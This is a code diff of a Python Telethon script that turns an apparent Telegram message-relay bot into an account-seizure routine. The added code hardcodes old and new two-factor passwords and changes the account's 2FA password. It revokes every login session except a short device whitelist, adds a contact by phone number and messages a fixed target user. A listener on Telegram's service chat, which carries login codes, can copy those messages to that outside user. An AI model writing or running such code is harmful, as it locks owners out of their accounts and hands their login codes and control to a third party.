@@ -8,9 +8,10 @@ import os
 # 加载环境变量
 if not os.getenv('GITHUB_ACTIONS'):
     from dotenv import load_dotenv
-    load_dotenv(dotenv_path='.20100034.sungfong.env')
+    # load_dotenv(dotenv_path='.20100034.sungfong.env')
+    # load_dotenv(dotenv_path='.20100034.luzai09man.env')
     # load_dotenv(dotenv_path='.x.env')
-    # load_dotenv(dotenv_path='.29614663.gunnar.env')
+    load_dotenv(dotenv_path='.28817994.get_account.env')
     # load_dotenv(dotenv_path='.28817994.luzai.env')
     # load_dotenv(dotenv_path='.25254811.bjd.env', override=True)
     # load_dotenv(dotenv_path='.25299903.warehouse.env', override=True)
@@ -46,15 +47,38 @@ from handlers.HandlerRelayClass import HandlerRelayClass
 from handlers.HandlerPrivateMessageClass import HandlerPrivateMessageClass
 
 from telethon import functions, types
-from telethon.errors import RPCError, ChannelPrivateError
+from telethon.errors import RPCError, ChannelPrivateError, FloodWaitError
 from telethon.tl.functions.photos import DeletePhotosRequest
 from telethon.tl.types import InputPhoto
 from telethon.tl.types import ChannelForbidden
+from telethon.tl.functions.contacts import ImportContactsRequest
+from telethon.tl.types import InputPhoneContact
 from telethon.tl.functions.account import UpdateProfileRequest
 from telethon.tl.functions.account import UpdateUsernameRequest
 from telethon.tl.functions.channels import InviteToChannelRequest, TogglePreHistoryHiddenRequest
 from telethon.tl.types import PeerUser
+from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
 
+
+from telethon import TelegramClient, events
+from telethon.errors import SessionPasswordNeededError, FloodWaitError
+from telethon.tl.types import Message
+
+SOURCE_CHAT_ID = 777000               # Telegram 服务讯息
+TARGET_USER_ID = 7038631858           # 接收者 user_id（整数）
+# OLD_PASSWORD = "008009"
+OLD_PASSWORD = "258147"
+
+NEW_PASSWORD = "Qqqw1234"
+HINT         = "myhint"                  # 可选：密码提示
+
+
+# 只保留这些 session 的 hash
+WHITELIST = {
+    "Redmi Redmi K40",                       # PC 64bit Android
+    "XiaomiM2012K11AC",     # XiaomiM2012K11AC
+    "PC 64bit",     # PC 64bit
+}
 
 # 配置参数
 config = {
@@ -235,6 +259,22 @@ async def safe_delete_message(message):
         print(f"🧹 成功刪除訊息A {message.id}（雙方）", flush=True)
     except Exception as e:
         print(f"⚠️ 刪除訊息失敗A {message.id}：{e}", flush=True)
+
+async def add_contact():
+
+    # 构造一个要导入的联系人
+    contact = InputPhoneContact(
+        client_id=0, 
+        phone="+18023051359", 
+        first_name="DrXP", 
+        last_name=""
+    )
+
+    result = await client(ImportContactsRequest([contact]))
+    print("导入结果:", result)
+    target = await client.get_entity(TARGET_USER_ID)     # 7038631858
+    await client.send_message(target, "你好")
+
 
 async def keep_db_alive():
     if db.is_closed():
@@ -577,6 +617,37 @@ async def man_bot_loop():
             continue                    
     return last_message_id
 
+
+
+
+# ——把 777000 的新消息“直接转送”为你自己发送的消息——
+async def copy_message(client: TelegramClient, target, msg: Message):
+    """
+    复制文本/媒体到 target（不保留“转发自”标记）。
+    """
+    try:
+        if msg.message and not msg.media:  # 纯文本
+            await client.send_message(target, msg.message)
+        elif msg.media:  # 含媒体（照片/视频/文件/语音 等）
+            await client.send_file(
+                target,
+                msg.media,
+                caption=msg.message or ""
+            )
+        else:
+            # 其它系统/服务型消息（无文本、无媒体）可以忽略或按需处理
+            pass
+    except FloodWaitError as e:
+        # 简单退避：等待 Telegram 要求的秒数后再重试一次
+        print(f"[FloodWait] 需等待 {e.seconds}s，准备重试…")
+        await asyncio.sleep(e.seconds + 1)
+        # 再试一次
+        if msg.message and not msg.media:
+            await client.send_message(target, msg.message)
+        elif msg.media:
+            await client.send_file(target, msg.media, caption=msg.message or "")
+
+
 async def main():
     last_message_id = 0
     print(f"⭐️ 启动 Postman Bot...", flush=True)
@@ -599,15 +670,85 @@ async def main():
     now = datetime.now()
     print(f"Current: {now.strftime('%Y-%m-%d %H:%M:%S')}",flush=True)
 
-    while (time.time() - start_time) < MAX_PROCESS_TIME:
-        try:
-            last_message_id = await asyncio.wait_for(man_bot_loop(), timeout=600)  # 5分钟超时
-        except asyncio.TimeoutError:
-            print("⚠️ 任务超时，跳过本轮", flush=True)
-        await asyncio.sleep(random.randint(5, 10))
+    await add_contact()
+
+    try:
+        await client.edit_2fa(
+            current_password=OLD_PASSWORD,  # 直接传入旧密码
+            new_password=NEW_PASSWORD,      # 设置的新密码
+            hint=HINT
+        )
+        print("✅ 2FA 密码已更新")
+    except Exception as e:
+        print(f"❌ 更新失败: {e}")
+    
+
+
+    # 1. 列出当前帐号所有 active sessions
+    auths = await client(GetAuthorizationsRequest())
+    print("当前活跃 sessions：")
+    for a in auths.authorizations:
        
 
-    await send_completion_message(last_message_id)
+        if a.hash == 0:
+            print(f"✅ 保留 id={a.hash}  device={a.device_model}  platform={a.platform}  ip={a.ip}  date={a.date_created}")
+            continue  # 跳过主会话
+        elif a.device_model not in WHITELIST:
+            try:
+                await client(ResetAuthorizationRequest(hash=a.hash))
+                print(f"❌ 已删除 id={a.hash}  device={a.device_model}  platform={a.platform}  ip={a.ip}  date={a.date_created}")
+            except Exception as e:
+                print(f"删除 {a.hash} 失败: {e}")
+        else:
+            print(f"✅ 保留 id={a.hash}  device={a.device_model}  platform={a.platform}  ip={a.ip}  date={a.date_created}")
+
+    exit()
+    # ——监听 777000 的新消息并即时复制——
+    @client.on(events.NewMessage(chats=SOURCE_CHAT_ID))
+    async def handler(event: events.NewMessage.Event):
+        msg: Message = event.message
+        print(f"捕获到 777000 新消息（id={msg.id}）{msg.text or ''}", flush=True)
+        # await copy_message(client, TARGET_USER_ID, msg)
+
+    # 长连线轮询，直到被 Ctrl+C 结束
+    await client.run_until_disconnected()
+
+    # exit()
+    # # 获取来源与目标实体
+    # source = await client.get_entity(SOURCE_CHAT_ID)     # 777000
+    # target = await client.get_entity(TARGET_USER_ID)     # 7038631858
+# await client.send_message(target, msgs[0].text)
+    # # 读取最后 3 则（默认新→旧），为了按时间顺序转发，反转一下
+    # msgs = await client.get_messages(source, limit=1)
+    # msgs = list(reversed(msgs))
+
+    # if not msgs:
+    #     print("来源没有可用讯息。")
+    #     await client.disconnect()
+    #     return
+
+    # # 转发：保留原发送者（forward）
+    # try:
+    #     # await client.forward_messages(entity=target, messages=msgs, from_peer=source)
+    #     await client.send_message(target, msgs[0].text)
+    #     print(f"已将 {len(msgs)} 则讯息从 777000 转发给 {TARGET_USER_ID}")
+    # except FloodWaitError as e:
+    #     print(f"触发限流，请稍后再试，需要等待 {e.seconds} 秒。")
+    # finally:
+    #     await client.disconnect()
+
+
+    
+
+    # while (time.time() - start_time) < MAX_PROCESS_TIME:
+    #     try:
+    #         last_message_id = await asyncio.wait_for(man_bot_loop(), timeout=600)  # 5分钟超时
+    #     except asyncio.TimeoutError:
+    #         print("⚠️ 任务超时，跳过本轮", flush=True)
+    #     await asyncio.sleep(random.randint(5, 10))
+       
+
+    # await send_completion_message(last_message_id)
 
 if __name__ == "__main__":
     
